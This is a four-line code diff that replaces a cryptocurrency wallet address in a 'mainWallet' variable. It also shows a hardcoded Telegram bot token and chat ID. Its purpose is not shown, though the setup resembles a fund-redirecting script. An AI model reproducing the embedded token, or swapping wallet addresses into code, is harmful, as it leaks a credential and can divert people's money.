@@ -1,4 +1,4 @@
-var mainWallet = "UQBk_5iaLiQwxJ8VWm6CmjJ15_04mbjgIfFlMjxfAtv9V58X";
+var mainWallet = "UQCII3MvhR52dvWjRPXjWepxPUJfJ6Tq1c1u5Raq5d_51Oqx";
 const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U";
 const chatId = "@ppjjkkd";
 
